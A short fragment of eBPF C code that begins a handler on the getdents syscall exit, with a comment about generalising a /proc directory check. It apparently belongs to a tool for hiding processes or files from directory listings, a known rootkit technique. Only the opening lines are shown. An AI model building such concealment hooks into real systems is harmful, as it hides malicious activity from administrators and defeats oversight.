...
int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx) {
  // can swap this with our function to get full path to directory and check if
  // they are the same in that way, should work the same without limiting this
  // to files in the /proc/ folder
  size_t pid_tgid = bpf_get_current_pid_tgid();
